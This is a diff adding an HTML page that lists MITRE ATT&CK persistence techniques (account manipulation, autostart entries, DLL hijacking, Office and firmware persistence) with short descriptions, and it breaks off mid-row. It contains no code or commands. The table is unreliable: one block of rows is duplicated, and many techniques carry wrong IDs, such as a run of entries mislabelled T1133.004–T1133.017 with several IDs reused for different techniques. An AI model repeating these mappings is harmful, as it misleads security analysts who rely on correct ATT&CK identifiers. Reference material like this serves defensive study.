@@ -1,0 +1,1650 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malware Persistence Techniques - MITRE ATT&CK</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f9;
+        }
+        h1, h2 {
+            text-align: center;
+            color: #333;
+        }
+        table {
+            width: 100%;
+            margin-top: 20px;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #ddd;
+        }
+        th {
+            background-color: #4CAF50;
+            color: white;
+        }
+        tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+        .table-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            overflow-x: auto;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            padding: 5px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Malware Persistence Techniques (MITRE ATT&CK)</h1>
+    <p>Persistence is a critical element of adversary tactics, ensuring that they can maintain access to a compromised system even after reboots or security measures are put in place. Below is a list of persistence techniques as defined by the MITRE ATT&CK framework.</p>
+
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Name</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- Table Rows for Persistence Techniques -->
+                <tr>
+                    <td>T1098</td>
+                    <td>Account Manipulation</td>
+                    <td>Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. This could involve modifying credentials or permission groups.</td>
+                </tr>
+                <tr>
+                    <td>T1098.001</td>
+                    <td>Additional Cloud Credentials</td>
+                    <td>Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances.</td>
+                </tr>
+                <tr>
+                    <td>T1098.002</td>
+                    <td>Additional Email Delegate Permissions</td>
+                    <td>Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.</td>
+                </tr>
+                <tr>
+                    <td>T1098.003</td>
+                    <td>Additional Cloud Roles</td>
+                    <td>An adversary may add additional roles or permissions to a cloud account to maintain persistent access, such as modifying IAM policies or adding a new global administrator.</td>
+                </tr>
+                <tr>
+                    <td>T1098.004</td>
+                    <td>SSH Authorized Keys</td>
+                    <td>Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host, allowing remote login without a password.</td>
+                </tr>
+                <tr>
+                    <td>T1098.005</td>
+                    <td>Device Registration</td>
+                    <td>Adversaries may register a device to an adversary-controlled account to maintain persistence, including in multifactor authentication (MFA) systems.</td>
+                </tr>
+                <tr>
+                    <td>T1098.006</td>
+                    <td>Additional Container Cluster Roles</td>
+                    <td>An adversary may add roles or permissions to a service account in container orchestration systems, such as Kubernetes, to maintain persistence.</td>
+                </tr>
+                <tr>
+                    <td>T1098.007</td>
+                    <td>Additional Local or Domain Groups</td>
+                    <td>An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.</td>
+                </tr>
+                <tr>
+                    <td>T1197</td>
+                    <td>BITS Jobs</td>
+                    <td>Adversaries may abuse the Windows Background Intelligent Transfer Service (BITS) jobs to persistently execute code and perform various background tasks.</td>
+                </tr>
+                <tr>
+                    <td>T1547</td>
+                    <td>Boot or Logon Autostart Execution</td>
+                    <td>Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence.</td>
+                </tr>
+                <tr>
+                    <td>T1547.001</td>
+                    <td>Registry Run Keys / Startup Folder</td>
+                    <td>Adversaries may achieve persistence by adding a program to the startup folder or referencing it in a Registry run key.</td>
+                </tr>
+                <tr>
+                    <td>T1547.002</td>
+                    <td>Authentication Package</td>
+                    <td>Adversaries may abuse authentication packages to execute DLLs when the system boots. These packages are loaded by the Local Security Authority (LSA) process.</td>
+                </tr>
+                <tr>
+                    <td>T1547.003</td>
+                    <td>Time Providers</td>
+                    <td>Adversaries may abuse time providers (W32Time) to execute DLLs when the system boots.</td>
+                </tr>
+                <tr>
+                    <td>T1547.004</td>
+                    <td>Winlogon Helper DLL</td>
+                    <td>Adversaries may abuse features of Winlogon to execute DLLs when a user logs in, using registry entries for configuration.</td>
+                </tr>
+                <tr>
+                    <td>T1547.005</td>
+                    <td>Security Support Provider</td>
+                    <td>Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots, giving them access to encrypted and plaintext passwords.</td>
+                </tr>
+                <tr>
+                    <td>T1547.006</td>
+                    <td>Kernel Modules and Extensions</td>
+                    <td>Adversaries may modify the kernel to automatically execute programs on system boot by loading Loadable Kernel Modules (LKMs).</td>
+                </tr>
+                <tr>
+                    <td>T1547.007</td>
+                    <td>Re-opened Applications</td>
+                    <td>Adversaries may modify plist files to automatically run an application when a user logs in on macOS.</td>
+                </tr>
+                <tr>
+                    <td>T1547.008</td>
+                    <td>LSASS Driver</td>
+                    <td>Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems by exploiting Windows' Local Security Authority Subsystem Service (LSASS).</td>
+                </tr>
+                <tr>
+                    <td>T1547.009</td>
+                    <td>Shortcut Modification</td>
+                    <td>Adversaries may create or modify shortcuts to execute programs during system boot or user login.</td>
+                </tr>
+                <tr>
+                    <td>T1547.010</td>
+                    <td>Port Monitors</td>
+                    <td>Adversaries may use port monitors to run a malicious DLL during system boot for persistence or privilege escalation.</td>
+                </tr>
+                <tr>
+                    <td>T1547.012</td>
+                    <td>Print Processors</td>
+                    <td>Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.</td>
+                </tr>
+                <tr>
+                    <td>T1547.013</td>
+                    <td>XDG Autostart Entries</td>
+                    <td>Adversaries may add or modify XDG Autostart Entries to execute malicious programs when a user’s desktop environment is loaded at login on Linux systems.</td>
+                </tr>
+                <tr>
+                    <td>T1547.014</td>
+                    <td>Active Setup</td>
+                    <td>Adversaries may add a registry key to the Active Setup mechanism in Windows to run programs when a user logs in.</td>
+                </tr>
+                <tr>
+                    <td>T1547.015</td>
+                    <td>Login Items</td>
+                    <td>Adversaries may add login items to execute upon user login to gain persistence or escalate privileges on macOS systems.</td>
+                </tr>
+   <tr>
+                    <td>T1037</td>
+                    <td>Boot or Logon Initialization Scripts</td>
+                    <td>Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. These can execute administrative tasks or programs, and send information to logging servers.</td>
+                </tr>
+                <tr>
+                    <td>T1037.001</td>
+                    <td>Logon Script (Windows)</td>
+                    <td>Adversaries may use logon scripts to execute tasks automatically when a user logs in to a Windows system.</td>
+                </tr>
+                <tr>
+                    <td>T1037.002</td>
+                    <td>Login Hook</td>
+                    <td>Adversaries may configure login hooks to execute a program during user login.</td>
+                </tr>
+                <tr>
+                    <td>T1037.003</td>
+                    <td>Network Logon Script</td>
+                    <td>Adversaries may deploy scripts that execute across a network upon user logon.</td>
+                </tr>
+                <tr>
+                    <td>T1037.004</td>
+                    <td>RC Scripts</td>
+                    <td>Adversaries may modify the ~/.bashrc or other shell scripts to execute malicious code upon login on Unix-like systems.</td>
+                </tr>
+                <tr>
+                    <td>T1037.005</td>
+                    <td>Startup Items</td>
+                    <td>Adversaries may add programs to startup directories, so they execute each time the system reboots.</td>
+                </tr>
+
+                <!-- Browser Extensions -->
+                <tr>
+                    <td>T1176</td>
+                    <td>Browser Extensions</td>
+                    <td>Adversaries may abuse browser extensions to maintain access to victim systems. Extensions have access to everything the browser can access and can execute programs on the victim's behalf.</td>
+                </tr>
+
+                <!-- Compromise Host Software Binary -->
+                <tr>
+                    <td>T1554</td>
+                    <td>Compromise Host Software Binary</td>
+                    <td>Adversaries may modify software binaries to gain persistent access, affecting applications like SSH clients or web browsers.</td>
+                </tr>
+
+                <!-- Create Account -->
+                <tr>
+                    <td>T1136</td>
+                    <td>Create Account</td>
+                    <td>Adversaries may create accounts to gain sustained access to systems. This tactic can include local, domain, and cloud-based accounts.</td>
+                </tr>
+                <tr>
+                    <td>T1136.001</td>
+                    <td>Local Account</td>
+                    <td>Adversaries may create local user accounts to establish persistent access to a system.</td>
+                </tr>
+                <tr>
+                    <td>T1136.002</td>
+                    <td>Domain Account</td>
+                    <td>Adversaries may create domain accounts to establish access to networked systems within an organization.</td>
+                </tr>
+                <tr>
+                    <td>T1136.003</td>
+                    <td>Cloud Account</td>
+                    <td>Adversaries may create cloud accounts to establish persistent access to cloud infrastructure or services.</td>
+                </tr>
+
+                <!-- Create or Modify System Process -->
+                <tr>
+                    <td>T1543</td>
+                    <td>Create or Modify System Process</td>
+                    <td>Adversaries may create or modify system processes to execute malicious payloads that run automatically, typically as system services.</td>
+                </tr>
+                <tr>
+                    <td>T1543.001</td>
+                    <td>Launch Agent</td>
+                    <td>Adversaries may configure Launch Agents on macOS systems to execute payloads at startup.</td>
+                </tr>
+                <tr>
+                    <td>T1543.002</td>
+                    <td>Systemd Service</td>
+                    <td>Adversaries may configure systemd services to run malicious payloads on Linux systems.</td>
+                </tr>
+                <tr>
+                    <td>T1543.003</td>
+                    <td>Windows Service</td>
+                    <td>Adversaries may configure malicious Windows services to maintain persistence on a system.</td>
+                </tr>
+                <tr>
+                    <td>T1543.004</td>
+                    <td>Launch Daemon</td>
+                    <td>Adversaries may abuse launch daemons on macOS to execute malicious payloads at system startup.</td>
+                </tr>
+
+                <!-- Event Triggered Execution -->
+                <tr>
+                    <td>T1546</td>
+                    <td>Event Triggered Execution</td>
+                    <td>Adversaries may configure event-triggered execution to run malicious payloads when specific system events occur, such as a logon or application launch.</td>
+                </tr>
+                <tr>
+                    <td>T1546.001</td>
+                    <td>Change Default File Association</td>
+                    <td>Adversaries may modify default file associations to automatically execute malicious code when a file is opened.</td>
+                </tr>
+                <tr>
+                    <td>T1546.002</td>
+                    <td>Screensaver</td>
+                    <td>Adversaries may configure screensavers to execute malicious payloads when the system is idle.</td>
+                </tr>
+                <tr>
+                    <td>T1546.003</td>
+                    <td>Windows Management Instrumentation Event Subscription</td>
+                    <td>Adversaries may use WMI event subscriptions to execute malicious payloads based on specific system events.</td>
+                </tr>
+                <tr>
+                    <td>T1546.004</td>
+                    <td>Unix Shell Configuration Modification</td>
+                    <td>Adversaries may modify Unix shell configurations to run malicious commands at startup.</td>
+                </tr>
+
+                <!-- External Remote Services -->
+                <tr>
+                    <td>T1133</td>
+                    <td>External Remote Services</td>
+                    <td>Adversaries may exploit external-facing services to maintain persistent access to compromised systems. These services can include VPNs, Citrix, and RDP.</td>
+                </tr>
+
+                <!-- Hijack Execution Flow -->
+                <tr>
+                    <td>T1574</td>
+                    <td>Hijack Execution Flow</td>
+                    <td>Adversaries may hijack execution flow to gain persistent access, injecting malicious code into legitimate processes or altering system behavior.</td>
+                </tr>
+                <tr>
+                    <td>T1574.001</td>
+                    <td>DLL Search Order Hijacking</td>
+                    <td>Adversaries may hijack the search order of dynamic link libraries (DLLs) to load malicious versions in place of legitimate ones.</td>
+                </tr>
+                <tr>
+                    <td>T1574.002</td>
+                    <td>DLL Side-Loading</td>
+                    <td>Adversaries may side-load malicious DLLs to execute malicious payloads in trusted applications.</td>
+                </tr>
+                <tr>
+                    <td>T1574.003</td>
+                    <td>Executable Installer File Permissions Weakness</td>
+                    <td>Adversaries may exploit file permission weaknesses in executable installers to persistently execute malicious code.</td>
+                </tr>
+		 <tr>
+                    <td>T1098</td>
+                    <td>Account Manipulation</td>
+                    <td>Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. This could involve modifying credentials or permission groups.</td>
+                </tr>
+                <tr>
+                    <td>T1098.001</td>
+                    <td>Additional Cloud Credentials</td>
+                    <td>Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances.</td>
+                </tr>
+                <tr>
+                    <td>T1098.002</td>
+                    <td>Additional Email Delegate Permissions</td>
+                    <td>Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.</td>
+                </tr>
+                <tr>
+                    <td>T1098.003</td>
+                    <td>Additional Cloud Roles</td>
+                    <td>An adversary may add additional roles or permissions to a cloud account to maintain persistent access, such as modifying IAM policies or adding a new global administrator.</td>
+                </tr>
+                <tr>
+                    <td>T1098.004</td>
+                    <td>SSH Authorized Keys</td>
+                    <td>Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host, allowing remote login without a password.</td>
+                </tr>
+                <tr>
+                    <td>T1098.005</td>
+                    <td>Device Registration</td>
+                    <td>Adversaries may register a device to an adversary-controlled account to maintain persistence, including in multifactor authentication (MFA) systems.</td>
+                </tr>
+                <tr>
+                    <td>T1098.006</td>
+                    <td>Additional Container Cluster Roles</td>
+                    <td>An adversary may add roles or permissions to a service account in container orchestration systems, such as Kubernetes, to maintain persistence.</td>
+                </tr>
+                <tr>
+                    <td>T1098.007</td>
+                    <td>Additional Local or Domain Groups</td>
+                    <td>An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.</td>
+                </tr>
+                <tr>
+                    <td>T1197</td>
+                    <td>BITS Jobs</td>
+                    <td>Adversaries may abuse the Windows Background Intelligent Transfer Service (BITS) jobs to persistently execute code and perform various background tasks.</td>
+                </tr>
+                <tr>
+                    <td>T1547</td>
+                    <td>Boot or Logon Autostart Execution</td>
+                    <td>Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence.</td>
+                </tr>
+                <tr>
+                    <td>T1547.001</td>
+                    <td>Registry Run Keys / Startup Folder</td>
+                    <td>Adversaries may achieve persistence by adding a program to the startup folder or referencing it in a Registry run key.</td>
+                </tr>
+                <tr>
+                    <td>T1547.002</td>
+                    <td>Authentication Package</td>
+                    <td>Adversaries may abuse authentication packages to execute DLLs when the system boots. These packages are loaded by the Local Security Authority (LSA) process.</td>
+                </tr>
+                <tr>
+                    <td>T1547.003</td>
+                    <td>Time Providers</td>
+                    <td>Adversaries may abuse time providers (W32Time) to execute DLLs when the system boots.</td>
+                </tr>
+                <tr>
+                    <td>T1547.004</td>
+                    <td>Winlogon Helper DLL</td>
+                    <td>Adversaries may abuse features of Winlogon to execute DLLs when a user logs in, using registry entries for configuration.</td>
+                </tr>
+                <tr>
+                    <td>T1547.005</td>
+                    <td>Security Support Provider</td>
+                    <td>Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots, giving them access to encrypted and plaintext passwords.</td>
+                </tr>
+                <tr>
+                    <td>T1547.006</td>
+                    <td>Kernel Modules and Extensions</td>
+                    <td>Adversaries may modify the kernel to automatically execute programs on system boot by loading Loadable Kernel Modules (LKMs).</td>
+                </tr>
+                <tr>
+                    <td>T1547.007</td>
+                    <td>Re-opened Applications</td>
+                    <td>Adversaries may modify plist files to automatically run an application when a user logs in on macOS.</td>
+                </tr>
+                <tr>
+                    <td>T1547.008</td>
+                    <td>LSASS Driver</td>
+                    <td>Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems by exploiting Windows' Local Security Authority Subsystem Service (LSASS).</td>
+                </tr>
+                <tr>
+                    <td>T1547.009</td>
+                    <td>Shortcut Modification</td>
+                    <td>Adversaries may create or modify shortcuts to execute programs during system boot or user login.</td>
+                </tr>
+                <tr>
+                    <td>T1547.010</td>
+                    <td>Port Monitors</td>
+                    <td>Adversaries may use port monitors to run a malicious DLL during system boot for persistence or privilege escalation.</td>
+                </tr>
+                <tr>
+                    <td>T1547.012</td>
+                    <td>Print Processors</td>
+                    <td>Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.</td>
+                </tr>
+                <tr>
+                    <td>T1547.013</td>
+                    <td>XDG Autostart Entries</td>
+                    <td>Adversaries may add or modify XDG Autostart Entries to execute malicious programs when a user’s desktop environment is loaded at login on Linux systems.</td>
+                </tr>
+                <tr>
+                    <td>T1547.014</td>
+                    <td>Active Setup</td>
+                    <td>Adversaries may add a registry key to the Active Setup mechanism in Windows to run programs when a user logs in.</td>
+                </tr>
+                <tr>
+                    <td>T1547.015</td>
+                    <td>Login Items</td>
+                    <td>Adversaries may add login items to execute upon user login to gain persistence or escalate privileges on macOS systems.</td>
+                </tr>
+                <!-- Additional Entries -->
+                <tr>
+                    <td>T1133.004</td>
+                    <td>Unix Shell Configuration Modification</td>
+                    <td>Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated.</td>
+                </tr>
+                <tr>
+                    <td>T1133.005</td>
+                    <td>Trap</td>
+                    <td>Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals, such as common keyboard interrupts like ctrl+c and ctrl+d.</td>
+                </tr>
+                <tr>
+                    <td>T1133.006</td>
+                    <td>LC_LOAD_DYLIB Addition</td>
+                    <td>Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that perform certain operations when a binary is loaded, and adversaries can add the LC_LOAD_DYLIB header to ensure malicious libraries are loaded.</td>
+                </tr>
+                <tr>
+                    <td>T1133.007</td>
+                    <td>Netsh Helper DLL</td>
+                    <td>Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe contains functionality to add helper DLLs for extending network configuration features.</td>
+                </tr>
+                <tr>
+                    <td>T1133.008</td>
+                    <td>Accessibility Features</td>
+                    <td>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features, such as modifying programs launched during login to gain a command prompt or backdoor access.</td>
+                </tr>
+                <tr>
+                    <td>T1133.009</td>
+                    <td>AppCert DLLs</td>
+                    <td>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. These DLLs are loaded into every process that calls certain APIs.</td>
+                </tr>
+                <tr>
+                    <td>T1133.010</td>
+                    <td>AppInit DLLs</td>
+                    <td>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. These DLLs are loaded into nearly every program that uses user32.dll.</td>
+                </tr>
+                <tr>
+                    <td>T1133.011</td>
+                    <td>Application Shimming</td>
+                    <td>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims, which are used to enable backward compatibility for software.</td>
+                </tr>
+                <tr>
+                    <td>T1133.012</td>
+                    <td>Image File Execution Options Injection</td>
+                    <td>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by IFEO debuggers. IFEOs allow for the attachment of a debugger to processes when they are launched.</td>
+                </tr>
+                <tr>
+                    <td>T1133.013</td>
+                    <td>PowerShell Profile</td>
+                    <td>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles, which are scripts that run when PowerShell starts.</td>
+                </tr>
+                <tr>
+                    <td>T1133.014</td>
+                    <td>Emond</td>
+                    <td>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond) on macOS systems.</td>
+                </tr>
+                <tr>
+                    <td>T1133.015</td>
+                    <td>Component Object Model Hijacking</td>
+                    <td>Adversaries may establish persistence by hijacking COM objects and executing malicious content triggered by these hijacked references.</td>
+                </tr>
+                <tr>
+                    <td>T1133.016</td>
+                    <td>Installer Packages</td>
+                    <td>Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content during installation or setup procedures.</td>
+                </tr>
+                <tr>
+                    <td>T1133.017</td>
+                    <td>Udev Rules</td>
+                    <td>Adversaries may maintain persistence by using udev rules to execute malicious content triggered by hardware events in Linux systems.</td>
+                </tr>
+ <tr>
+                    <td>T1133.009</td>
+                    <td>Path Interception by Unquoted Path</td>
+                    <td>Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.</td>
+                </tr>
+                <tr>
+                    <td>T1133.010</td>
+                    <td>Services File Permissions Weakness</td>
+                    <td>Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.</td>
+                </tr>
+                <tr>
+                    <td>T1133.011</td>
+                    <td>Services Registry Permissions Weakness</td>
+                    <td>Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions.</td>
+                </tr>
+                <tr>
+                    <td>T1133.012</td>
+                    <td>COR_PROFILER</td>
+                    <td>Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.</td>
+                </tr>
+                <tr>
+                    <td>T1133.013</td>
+                    <td>KernelCallbackTable</td>
+                    <td>Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.</td>
+                </tr>
+                <tr>
+                    <td>T1133.014</td>
+                    <td>AppDomainManager</td>
+                    <td>Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.</td>
+                </tr>
+                <tr>
+                    <td>T1525</td>
+                    <td>Implant Internal Image</td>
+                    <td>Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.</td>
+                </tr>
+                <tr>
+                    <td>T1556</td>
+                    <td>Modify Authentication Process</td>
+                    <td>Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.</td>
+                </tr>
+                <tr>
+                    <td>T1556.001</td>
+                    <td>Domain Controller Authentication</td>
+                    <td>Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.</td>
+                </tr>
+                <tr>
+                    <td>T1556.002</td>
+                    <td>Password Filter DLL</td>
+                    <td>Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.</td>
+                </tr>
+                <tr>
+                    <td>T1556.003</td>
+                    <td>Pluggable Authentication Modules</td>
+                    <td>Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.</td>
+                </tr>
+                <tr>
+                    <td>T1556.004</td>
+                    <td>Network Device Authentication</td>
+                    <td>Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing native authentication mechanisms for local accounts on network devices.</td>
+                </tr>
+                <tr>
+                    <td>T1556.005</td>
+                    <td>Reversible Encryption</td>
+                    <td>An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.</td>
+                </tr>
+                <tr>
+                    <td>T1556.006</td>
+                    <td>Multi-Factor Authentication</td>
+                    <td>Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.</td>
+                </tr>
+                <tr>
+                    <td>T1556.007</td>
+                    <td>Hybrid Identity</td>
+                    <td>Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.</td>
+                </tr>
+                <tr>
+                    <td>T1556.008</td>
+                    <td>Network Provider DLL</td>
+                    <td>Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.</td>
+                </tr>
+                <tr>
+                    <td>T1556.009</td>
+                    <td>Conditional Access Policies</td>
+                    <td>Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.</td>
+                </tr>
+                <tr>
+                    <td>T1137</td>
+                    <td>Office Application Startup</td>
+                    <td>Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.</td>
+                </tr>
+                <tr>
+                    <td>T1137.001</td>
+                    <td>Office Template Macros</td>
+                    <td>Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.</td>
+                </tr>
+                <tr>
+                    <td>T1137.002</td>
+                    <td>Office Test</td>
+                    <td>Adversaries may abuse the Microsoft Office "Office Test" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.</td>
+                </tr>
+                <tr>
+                    <td>T1137.003</td>
+                    <td>Outlook Forms</td>
+                    <td>Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.</td>
+                </tr>
+                <tr>
+                    <td>T1137.004</td>
+                    <td>Outlook Home Page</td>
+                    <td>Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.</td>
+                </tr>
+                <tr>
+                    <td>T1137.005</td>
+                    <td>Outlook Rules</td>
+                    <td>Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.</td>
+                </tr>
+ <tr>
+                <td>T1137.006</td>
+                <td>Office Add-ins</td>
+                <td>Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. There are different types of add-ins that can be used by the various Office products, including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins.</td>
+            </tr>
+            <tr>
+                <td>T1653</td>
+                <td>Power Settings</td>
+                <td>Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate, which can disrupt malicious activity.</td>
+            </tr>
+            <tr>
+                <td>T1542</td>
+                <td>Pre-OS Boot</td>
+                <td>Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control the flow of execution before the operating system takes control.</td>
+            </tr>
+            <tr>
+                <td>T1542.001</td>
+                <td>System Firmware</td>
+                <td>Adversaries may modify system firmware to persist on systems. The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.</td>
+            </tr>
+            <tr>
+                <td>T1542.002</td>
+                <td>Component Firmware</td>
+                <td>Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS.</td>
+            </tr>
+            <tr>
+                <td>T1542.003</td>
+                <td>Bootkit</td>
+                <td>Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.</td>
+            </tr>
+            <tr>
+                <td>T1542.004</td>
+                <td>ROMMONkit</td>
+                <td>Adversaries may abuse the ROM Monitor (ROMMON) by loading unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.</td>
+            </tr>
+            <tr>
+                <td>T1542.005</td>
+                <td>TFTP Boot</td>
+                <td>Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. Netbooting is commonly used by network administrators to load configuration-controlled network device images from a centralized management server.</td>
+            </tr>
+            <tr>
+                <td>T1053</td>
